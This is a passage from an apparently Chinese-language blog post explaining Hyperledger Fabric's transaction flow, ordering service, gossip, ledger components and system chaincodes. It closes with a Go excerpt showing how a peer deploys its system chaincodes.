			srcset=&#34;/post/fabric-architecture-and-systemchaincode/transaction_flow_hu0a9c6a7b10b3417d128489bbce7c86a7_46092_480x0_resize_box_3.png 480w, /post/fabric-architecture-and-systemchaincode/transaction_flow_hu0a9c6a7b10b3417d128489bbce7c86a7_46092_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;transaction_flow&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;transaction_flow&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;执行阶段&#34;&gt;执行阶段&lt;/h4&gt;
&lt;p&gt;在执行阶段，客户端签署并发送一个交易提案给一个或多个背书节点来执行（根据背书政策，每个chaincode都有特定的一组背书节点）。一个交易提案包含了提交客户端的身份（根据MSP），交易的载荷、参数、链码标识符、每个客户端只能使用一次的nonce（随机值或计数器），以及客户端标识符和nonce生成的交易标识符。&lt;/p&gt;
&lt;p&gt;背书节点会对交易提案进行模拟，在指定的区块链链码上执行操作。模拟操作在背书节点的本地区块链状态中进行模拟，不与其它节点同步，也不会将模拟的结果永久化到帐本中。区块链的状态仍然由节点交易管理器(&lt;em&gt;Peer Transaction Manager&lt;/em&gt;)维护。一个链码创建的状态只能限定在该链码上，不能被其他的链码直接访问。需要注意的是，链码只能维护GetState、PutState、DelState操作访问的内容（&lt;em&gt;可能意思是：需要使用这些接口进行访问，不能直接修改，猜测状态权限为private&lt;/em&gt;）。给予适当的权限，链码可以调用同一个通道的链码，并访问其状态。&lt;/p&gt;
&lt;p&gt;在模拟后，背书节点会产生一个&lt;em&gt;writeset&lt;/em&gt;，其中包括模拟产生的状态更新，和一个&lt;em&gt;readset&lt;/em&gt;，代表交易提案模拟的版本依赖（模拟时的所有密钥以及对应的版本号）。在模拟结束后，背书节点会以加密的方式签署一份“背书”消息，包括了&lt;em&gt;writeset&lt;/em&gt;和&lt;em&gt;readset&lt;/em&gt;（包括交易id和背书节点的一些数据），随后以响应的方式发送给客户端。客户端收集背书，直到满足链码的背书政策，开始交易。特别的，这要求政策决定的所有背书节点都返回相同的&lt;em&gt;writeset&lt;/em&gt;和&lt;em&gt;readset&lt;/em&gt;。然后，客户端将继续创建交易，并传递给排序阶段。&lt;/p&gt;
&lt;h4 id=&#34;排序阶段&#34;&gt;排序阶段&lt;/h4&gt;
&lt;p&gt;客户端收集到足够的背书后，将会把交易组装起来并发送给排序服务端。整个交易包括了载荷(&lt;em&gt;payload&lt;/em&gt;)（包括参数的链码操作）、交易元数据、背书的集合。排序阶段对每个通道的所有提交建立了一个排序。排序服务端会将多个交易分成块，输出包含交易的哈希链序列，以提高广播协议的吞吐量。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;broadcast(tx)&lt;/code&gt;：客户端调用这个函数来广播交易&lt;code&gt;tx&lt;/code&gt;，包含了载荷和签名。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;B&lt;/code&gt; $\leftarrow$ &lt;code&gt;deliver(s)&lt;/code&gt;：客户端调用这个函数来获取非负序列号&lt;code&gt;s&lt;/code&gt;的区块&lt;code&gt;B&lt;/code&gt;，$B=([tx_1,tx_2,\ldots,tx_k],h)$，$h$为&lt;code&gt;s-1&lt;/code&gt;区块的哈希值。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;排序服务确保了一个通道中的交付区块被完全排序，确保安全。&lt;/p&gt;
&lt;p&gt;然而，每一个单独的排序实现都允许在客户端请求中保证自己的活跃性与公平性。&lt;/p&gt;
&lt;p&gt;由于区块链中包含了大量的节点，但仅有少部分节点实现了排序服务，因此Fabric可以配置使用内置的gossip服务，将排序服务中交付的区块分发给所有的节点。&lt;/p&gt;
&lt;h4 id=&#34;验证阶段&#34;&gt;验证阶段&lt;/h4&gt;
&lt;p&gt;排序服务会把区块直接分发给各个节点（或通过&lt;em&gt;gossip&lt;/em&gt;）。随后，一个新的区块进入验证阶段，包含三个连续步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;并行执行区块中所有的交易的背书政策评估。评估是验证系统链码(VSCC, &lt;em&gt;validation system chaincode&lt;/em&gt;)的任务。VSCC是一个静态库，是区块链配置的一部分，负责根据链码中的背书政策验证背书。如果不满足，这个交易会被标记为无效，并被忽略。&lt;/li&gt;
&lt;li&gt;对块中的所有交易进行读写冲突检查(&lt;em&gt;read-write conflict check&lt;/em&gt;)（版本号比较）。对于每个交易，将会对比其中readset的版本号和节点本地存储的账本当前状态中的版本号，确保版本相同。如果版本不匹配，交易会被标记为无效，并被忽略。&lt;/li&gt;
&lt;li&gt;最后进行账本的更新阶段，在这个阶段，区块被追加到本地存储的账本中，并且更新区块链的状态。将区块添加到账本时，前两步的检查结果将被持久化以掩码的形式表示区块中的交易有效。这有助于后面进行重建状态。此外，所有的状态更新都是通过将&lt;em&gt;writeset&lt;/em&gt;中的键值对写入本地完成的。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;信任与故障模型&#34;&gt;信任与故障模型&lt;/h3&gt;
&lt;p&gt;Fabric可以适应灵活的信任和故障假设。通常情况下，所有的客户端都被认为是潜在的恶意用户或是&lt;em&gt;Byzantine&lt;/em&gt;。节点都被归入组织(&lt;em&gt;organization&lt;/em&gt;)并且每个组织组成一个信任域(&lt;em&gt;trust domain&lt;/em&gt;)。每个节点信任其组织内部的其他节点，而不信任其他组织的节点。排序服务同样认为所有的节点（或客户端）都是潜在的拜占庭。&lt;/p&gt;
&lt;p&gt;Fabric网络的完整性依赖于排序服务的一致性。排序服务的信任模型取决于其实现。&lt;/p&gt;
&lt;p&gt;在Fabric中，分布式应用可以定义自己的信任假设，通过背书政策来传达，并且独立于排序服务实现的共识的信任假设。&lt;/p&gt;
&lt;h2 id=&#34;组件&#34;&gt;组件&lt;/h2&gt;
&lt;p&gt;Fabric使用了gRPC架构实现客户端、节点和排序服务之间的通信。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;What is gRPC?&lt;/p&gt;
&lt;p&gt;A high-performance, open-source universal RPC framework&lt;/p&gt;
&lt;p&gt;gRPC框架具有高性能，开源，跨语言的特点，使用了RPC框架，基于HTTP/2设计。&lt;/p&gt;
&lt;p&gt;RPC(&lt;em&gt;remote procedure call&lt;/em&gt;，远程过程调用)框架提供了一套机制，使得应用程序之间可以进行通信，遵从server/client模型。&lt;/p&gt;
&lt;p&gt;RPC将一个服务调用封装在一个本地方法中，让调用者像使用本地方法一样调用服务，对其屏蔽实现细节。具体的实现则通过调用方和服务方的协议，基于TCP连接进行数据交互达成。&lt;/p&gt;
&lt;p&gt;在本地调用过程中，通常需要通过接口，调用具体实现，最终获取相应的数据。&lt;/p&gt;
&lt;p&gt;而在RPC中，本地获取到接口，随后通过网络，调用远程的实现。在使用网络时，需要通过数据序列化来传输数据。&lt;/p&gt;
&lt;p&gt;在gRPC中，支持多个语言的应用程序的远程调用，数据交换格式则采用了&lt;em&gt;Protocol Buffer&lt;/em&gt;。&lt;/p&gt;
&lt;p&gt;如下图所示，左侧为c++语言编写的客户端，其中包含了接口的具体实现。右侧为Ruby和Java客户端，其中对接口进行了调用。客户端获取接口后，将数据通过&lt;em&gt;Protocol Buffer&lt;/em&gt;的序列化处理后交给服务端，服务端调用具体实现，并把数据同样以序列化的形式返回给客户端。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 153; 
			flex-basis: 368px&#34;
	&gt;
	&lt;a href=&#34;/post/fabric-architecture-and-systemchaincode/gRPC-basic.png&#34; data-size=&#34;551x359&#34;&gt;
		&lt;img src=&#34;/post/fabric-architecture-and-systemchaincode/gRPC-basic.png&#34;
			width=&#34;551&#34;
			height=&#34;359&#34;
			srcset=&#34;/post/fabric-architecture-and-systemchaincode/gRPC-basic_hub059a1a613bf04f533aa6587a1d95cb3_32092_480x0_resize_box_3.png 480w, /post/fabric-architecture-and-systemchaincode/gRPC-basic_hub059a1a613bf04f533aa6587a1d95cb3_32092_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;gRPC-basic&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;gRPC-basic&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;成员身份管理服务msp&#34;&gt;成员身份管理服务（MSP）&lt;/h3&gt;
&lt;p&gt;成员身份管理服务(MSP, &lt;em&gt;membership service provider&lt;/em&gt;)维护了系统中所有节点（客户端、节点、排序服务）的身分，并负责发布节点的凭证，用于认证和授权。节点之间的所有交互都是通过已认证的消息（通常是数字签名）发生的。成员身份管理包括每个节点的组件，可以认证交易、验证交易的完整性、签署并确认背书、验证其他的区块链操作。MSP中还包括了用于密钥管理和节点注册的工具。&lt;/p&gt;
&lt;p&gt;MSP是抽象的，可以有不同的实例。Fabric中，默认的MSP实现可以处理基于数字签名的PKI认证方法，并且容纳商业认证机构(CA)。Fabric提供了独立的CA——Fabric-CA。&lt;/p&gt;
&lt;p&gt;Fabric允许设置区块链网络的两种模式。在离线模式下，凭证由CA生成，并分发到所有节点。peer节点和排序节点只能在离线模式下注册。对于客户端的注册，Fabric-CA提供了在线模式，向客户端发送加密凭证。MSP的配置必须要确保所有的节点都能识别相同的身份和认证认定为有效（特别是所有的peer节点）。&lt;/p&gt;
&lt;p&gt;例如，当多个组织在同一个区块链网络中时，MSP需要能够允许身份的联合。每个组织向自己的成员发放身份，每个peer节点都能识别所有组织的成员。这可以通过多个MSP实例来实现。例如，在每个组织和一个MSP之间建立一个映射。&lt;/p&gt;
&lt;h3 id=&#34;排序服务&#34;&gt;排序服务&lt;/h3&gt;
&lt;p&gt;排序服务可管理多个通道，对每个通道，都提供如下三个服务：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;em&gt;Atomic broadcast&lt;/em&gt;，用于对交易进行排序，实现广播和分发&lt;/li&gt;
&lt;li&gt;重新配置(&lt;em&gt;reconfiguration&lt;/em&gt;)通道，成员通过广播一个配置更新事物(&lt;em&gt;configuration update transaction&lt;/em&gt;)修改通道。&lt;/li&gt;
&lt;li&gt;（可选择）访问控制(&lt;em&gt;access control&lt;/em&gt;)，在这些配置中，排序服务作为可信的实体，限制交易的广播和指定peer节点和客户端的块的接收&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;排序服务通过系统通道上的生成块进行引导。生成块携带了配置事务(&lt;em&gt;configuration transaction&lt;/em&gt;)，定义了排序服务的操作。&lt;/p&gt;
&lt;p&gt;当前版本的实现由OSN组成，OSN实现了描述的操作并且通过系统通道通信。实际的&lt;em&gt;atomic broadcast&lt;/em&gt;函数由基于&lt;em&gt;ZooKeeper&lt;/em&gt;的Kafka实例提供，这个实例提供了可以扩展的发布-订阅消息，在节点崩溃后仍具有强一致性(&lt;em&gt;consistency&lt;/em&gt;)。这个实现可以运行在与OSN分离的物理节点上。OSN作为peers和Kafka实例之间的代理。&lt;/p&gt;
&lt;p&gt;OSN直接将收到的新交易注入到广播中。OSN将从广播中接收到的交易转换成块。只要满足三个情况之一，块就会被断开。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;区块包含了交易允许的最大值&lt;/li&gt;
&lt;li&gt;区块达到最大大小&lt;/li&gt;
&lt;li&gt;从接收到第一个交易后超过某特定时间&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;批处理的过程是确定的，因此在所有节点上都会产生相同的区块。考虑到从广播中接收的交易数据流，前两项情况是已经确定的。对于第三个条件，当节点读入块中的第一个交易时，会开启一个计时器。如果计时器超时后，这个区块仍然没有断开，OSN会在通道上广播一个特殊的“到时断开(&lt;em&gt;time-to-cut&lt;/em&gt;)”交易，其中记录了需要断开的区块的序列号。另一方面，每个OSN在收到“到时断开”交易后，会根据其给定的序列号，立即切断新的区块。这个交易是原子性的分发给所有连接的OSN，所以区块中都包含相同的交易列表。OSN将最近交付的一系列区块直接持久化到文件系统中，因此可以通过分发回答peer节点来回收区块。&lt;/p&gt;
&lt;h3 id=&#34;peer-gossip&#34;&gt;Peer Gossip&lt;/h3&gt;
&lt;p&gt;将三个阶段分开的好处是在开发的时候可以独立扩展。然而，由于共识算法往往有带宽限制，排序服务的吞吐量被节点的网络容量所限制。共识无法通过增加节点而扩展，反而会让吞吐量降低。然而，由于排序和验证是分开的，在排序阶段后，重要的是如何有效地广播执行阶段的结果，以交给peer节点进行验证。此外，还有如何对新加入的peer节点和长期断开的peer节点进行状态转移。这两个问题就是gossip组件所需要解决的。Fabric gossip利用流行组播(&lt;em&gt;epidemic multicast&lt;/em&gt;)来解决这个问题。区块是由排序服务签署的。这意味着一个peer节点在收到所有区块后，可以独立的组装为区块链并验证其完整性。&lt;/p&gt;
&lt;p&gt;gossip的通信基于gRPC，利用TLS（传输层安全协议）进行相互识别，使得每一方都可以将TLS凭证与远程peer节点的身份绑定。gossip组件用来维护系统中当前在线的peer节点的成员视图。所有的peer节点通过定期传播成员数据独立建立一个本地视图。此外，一个peer节点可以在网络崩溃或者中断后重新连入成员视图。&lt;/p&gt;
&lt;p&gt;Fabric的gossip组件采用了两个阶段进行信息的传播：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在&lt;em&gt;push&lt;/em&gt;阶段，每个peer节点从成员视图中选择一个随机的活跃邻居集合，并向他们发送信息&lt;/li&gt;
&lt;li&gt;在&lt;em&gt;pull&lt;/em&gt;阶段，每个peer节点定期探测一个随机选择的peer节点集合，并请求缺失的信息&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;研究表明，同时使用这两种方法可以优化可用带宽并确保所有peer节点有很高的概率接收到所有信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;为了减少从排序节点向网络中发送的区块的负载，协议同时在peer中选择了一个领导者(&lt;em&gt;elects a leader peer&lt;/em&gt;)，代表peer节点从排序服务中&lt;em&gt;pull&lt;/em&gt;区块，并启动gossip分发。这个机制对领导者出现故障具有弹性。&lt;/p&gt;
&lt;h3 id=&#34;分布式账本ledger&#34;&gt;分布式账本(&lt;em&gt;Ledger&lt;/em&gt;)&lt;/h3&gt;
&lt;p&gt;账本组件在各个peer节点中维持分布式账本并建立持久性的存储，并实现账本的模拟、验证和更新阶段。整体上由一个区块存储(&lt;em&gt;block store&lt;/em&gt;)和一个peer节点交易管理器(&lt;em&gt;peer transaction manager&lt;/em&gt;)组成。&lt;/p&gt;
&lt;h4 id=&#34;区块存储ledger-block-store&#34;&gt;区块存储(Ledger Block Store)&lt;/h4&gt;
&lt;p&gt;账本区块存储持久化交易区块，并以一组仅追加文件的形式实现。由于区块无法被改变，并以一个特定的顺序到达，一个仅追加的结构能够带来最好的性能。此外，区块存储中维护了一些索引(&lt;em&gt;indices&lt;/em&gt;)，用来随机访问区块或区块中的交易。&lt;/p&gt;
&lt;h4 id=&#34;peer交易管理器peer-transaction-manager&#34;&gt;peer交易管理器(Peer Transaction Manager)&lt;/h4&gt;
&lt;p&gt;peer节点交易管理器(PTM)保持版本键值对处于最新状态。它能为每一个唯一的条目(&lt;em&gt;entry&lt;/em&gt;)的&lt;em&gt;key&lt;/em&gt;以(&lt;em&gt;key&lt;/em&gt;,&lt;em&gt;val&lt;/em&gt;, &lt;em&gt;ver&lt;/em&gt;)存储一个元组，其中包含了最近存储的值&lt;em&gt;val&lt;/em&gt;，和最新的版本号&lt;em&gt;var&lt;/em&gt;。版本由区块序列号和区块内的交易序列号组成，因此版本号都是唯一且递增的。PTM使用了本地键值存储来识别版本变量，具体实现使用了LevelDB和Apache CouchDB。&lt;/p&gt;
&lt;p&gt;在模拟时，PTM提供了一个稳定的最新状态快照。&lt;strong&gt;执行阶段&lt;/strong&gt;中提到，PTM在&lt;em&gt;readset&lt;/em&gt;中为GetState访问的每个条目记录一个元组(&lt;em&gt;key&lt;/em&gt;, &lt;em&gt;ver&lt;/em&gt;)，在&lt;em&gt;writeset&lt;/em&gt;中为交易调用PutState更新的每个条目记录一个元组(&lt;em&gt;key&lt;/em&gt;, &lt;em&gt;val&lt;/em&gt;)。此外，PTM支持范围查询(&lt;em&gt;range queries&lt;/em&gt;)，并计算出查询结果的加密哈希（一组(&lt;em&gt;key&lt;/em&gt;, &lt;em&gt;ver&lt;/em&gt;)元组），并将查询字符串和哈希添加到readset中。&lt;/p&gt;
&lt;p&gt;在验证阶段，PTM依次验证一个区块中的所有交易，检查交易是否与之前的任何交易产生冲突。对于readset中的所有key，如果readset中的版本记录与最新状态的版本不同，PTM就会把这个交易标记为无效。对于范围查找，PTM会重新执行查询并与之前的&lt;em&gt;readset&lt;/em&gt;比较哈希值，确保不发生错误的读取。&lt;/p&gt;
&lt;h4 id=&#34;崩溃处理&#34;&gt;崩溃处理&lt;/h4&gt;
&lt;p&gt;账本组件在更新时需要能处理peer节点的崩溃。&lt;/p&gt;
&lt;p&gt;在接收到一个新区块后，PTM已经对其进行了验证，并使用了掩码将区块中的交易标记为有效或无效。此时，账本将区块写入账本的区块存储中，刷新到磁盘，随后更新区块存储的索引。随后，PTM将所有有效交易的&lt;em&gt;writeset&lt;/em&gt;状态变化应用到本地存储中。最后，计算并持久化一个&lt;em&gt;savepoint&lt;/em&gt;的值，表示成功应用区块数量的最大值。从崩溃中恢复时，&lt;em&gt;savepoint&lt;/em&gt;值用来从持久化块中恢复索引和最新状态。&lt;/p&gt;
&lt;h3 id=&#34;链码执行&#34;&gt;链码执行&lt;/h3&gt;
&lt;p&gt;Chaincode在一个与其余peer节点松散耦合的环境中执行。支持增添新的链码编程语言的插件。目前支持Go、Java和Node。&lt;/p&gt;
&lt;p&gt;每个用户级或应用链码都在Docker容器环境中的独立进程中执行，这使得链码和peer节点之间相互隔离，简化了链码的生命周期管理（启动、停止、中止）。链码和peer节点通过gRCP通信。通过松散的耦合关系，peer节点不知道链码具体使用了什么语言实现。&lt;/p&gt;
&lt;p&gt;不同于应用链码，系统链码直接在peer节点的进程中运行，可以实现Fabric所需要的特定功能，可以用于用户链码之间的隔离限制过多的情况。&lt;/p&gt;
&lt;h3 id=&#34;配置和系统链码&#34;&gt;配置和系统链码&lt;/h3&gt;
&lt;p&gt;Fabric通过通道配置(&lt;em&gt;channel configuration&lt;/em&gt;)和系统链码(&lt;em&gt;system chaincodes&lt;/em&gt;)进行定制。&lt;/p&gt;
&lt;p&gt;Fabric中每个通道都会形成一个逻辑区块链。通道的配置由元数据进行维护，并永久保留在配置区块(&lt;em&gt;configuration blocks&lt;/em&gt;)中。每个配置区块都会包含完整的通道配置，并不会包括任何其他的东西。每个区块链都以一个配置区块开始，称之为创世块(&lt;em&gt;genesis block&lt;/em&gt;)，用于引导通道。通道的配置包括：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;参与节点的MSP定义；&lt;/li&gt;
&lt;li&gt;OSN的网络地址；&lt;/li&gt;
&lt;li&gt;共识实现和配许服务的共享配置，比如大小和超时等设置；&lt;/li&gt;
&lt;li&gt;管理对排序服务操作（广播和分发）访问的规则；&lt;/li&gt;
&lt;li&gt;管理如何修改通道配置的各个部分的规则。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通道的配置可以使用通道配置更新事务(&lt;em&gt;channel configuration update transaction&lt;/em&gt;)进行更新，其中需要包括对配置进行的修改和一组签名。排序节点通过使用当前的配置验证该签名是否得到授权，来评估此次更新是否有效。然后，排序节点生成一个新的配置区块，嵌入新的配置和配置更新事务。Peer节点接收后，根据当前的配置验证更新是否得到了授权，有效则进行配置更新。&lt;/p&gt;
&lt;p&gt;在部署应用链码时，会&lt;!-- raw HTML omitted --&gt;参考&lt;!-- raw HTML omitted --&gt;一个认可系统链码（&lt;em&gt;endorsement system chaincode&lt;/em&gt;, ESCC）和一个验证系统链码（&lt;em&gt;validation system chaincode&lt;/em&gt;, VSCC）。这两个链码的选择使得ESCC输出的背书，可以作为VSCC输入的一部分进行验证。ESCC将一个提案和提案模拟的结果作为输入。如果结果符合要求，则ESCC产生一个包含结果和认可的响应。对于默认的ESCC，这个背书只是peer节点的本地签名身份的签名。VSCC将一个事务作为输入，并输出该事务是否有效。对于默认的VSCC，背书被收集，并根据为链码指定的背书策略进行评估。进一步的系统链码实现其他支持功能，如链码生命周期。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;系统链码的核心代码在/fabric/core/common/sysccprovider和/fabric/core/scc下&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;系统链码&#34;&gt;系统链码&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 88; 
			flex-basis: 213px&#34;
	&gt;
	&lt;a href=&#34;/post/fabric-architecture-and-systemchaincode/%E7%B3%BB%E7%BB%9F%E9%93%BE%E7%A0%81%E7%BB%93%E6%9E%84%E5%9B%BE.png&#34; data-size=&#34;600x676&#34;&gt;
		&lt;img src=&#34;/post/fabric-architecture-and-systemchaincode/%E7%B3%BB%E7%BB%9F%E9%93%BE%E7%A0%81%E7%BB%93%E6%9E%84%E5%9B%BE.png&#34;
			width=&#34;600&#34;
			height=&#34;676&#34;
			srcset=&#34;/post/fabric-architecture-and-systemchaincode/%E7%B3%BB%E7%BB%9F%E9%93%BE%E7%A0%81%E7%BB%93%E6%9E%84%E5%9B%BE_hu3df4d83e11a62b95ad644cfb9bc48850_87422_480x0_resize_box_3.png 480w, /post/fabric-architecture-and-systemchaincode/%E7%B3%BB%E7%BB%9F%E9%93%BE%E7%A0%81%E7%BB%93%E6%9E%84%E5%9B%BE_hu3df4d83e11a62b95ad644cfb9bc48850_87422_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;系统链码结构图&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;系统链码结构图&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;与普通链码对比&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;系统链码&lt;/th&gt;
&lt;th&gt;普通链码&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;链码源码&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;无main函数&lt;/td&gt;
&lt;td&gt;有main函数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;运行空间&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;背书节点进程&lt;/td&gt;
&lt;td&gt;Docker&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;调用方式&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;网络+进程内部&lt;/td&gt;
&lt;td&gt;网络&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;启动参数&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;内置&lt;/td&gt;
&lt;td&gt;动态输入&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;通信方式&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Golang的通道机制&lt;/td&gt;
&lt;td&gt;网络&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;数据存取&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Golang的通道+本地文件&lt;/td&gt;
&lt;td&gt;网络&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;升级方式&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;和背书节点一起升级&lt;/td&gt;
&lt;td&gt;单独升级&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;背书策略&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;无&lt;/td&gt;
&lt;td&gt;有&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;系统链码在peer节点上的注册与部署&#34;&gt;系统链码在Peer节点上的注册与部署&lt;/h3&gt;
&lt;p&gt;peer节点存在于docker容器中，在启动时通过执行&lt;code&gt;peer node start&lt;/code&gt;命令来启动peer节点。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/internal/peer/node/start.go&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;start命令的入口函数为serve函数。&lt;/p&gt;
&lt;p&gt;以下源代码中仅保留部署系统链码的部分。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;serve&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt; {
    &lt;span style=&#34;color:#75715e&#34;&gt;// Initialize chaincode service
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    
	&lt;span style=&#34;color:#75715e&#34;&gt;// deploy system chaincodes
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cc&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;range&lt;/span&gt; []&lt;span style=&#34;color:#a6e22e&#34;&gt;scc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SelfDescribingSysCC&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;lsccInst&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;csccInst&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;qsccInst&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;lifecycleSCC&lt;/span&gt;} {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;enabled&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeConfig&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SCCWhitelist&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;cc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;()]; !&lt;span style=&#34;color:#a6e22e&#34;&gt;ok&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; !&lt;span style=&#34;color:#a6e22e&#34;&gt;enabled&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Infof&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;not deploying chaincode %s as it is not enabled&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;())
			&lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
		} &lt;span style=&#34;color:#75715e&#34;&gt;// 判断链码的设置是否为enabled
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;scc&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;DeploySysCC&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;cc&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeSupport&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 部署系统链码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	}

	&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Infof&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Deployed system chaincodes&amp;#34;&lt;/span&gt;)
	&lt;span style=&#34;color:#75715e&#34;&gt;//...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;通过遍历scc.SelfDescribingSysCC返回值，调用scc.DeploySysCC函数。&lt;/p&gt;
&lt;p&gt;找到scc源文件：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;corn/scc/scc.go&lt;/p&gt;
&lt;/blockquote&gt;
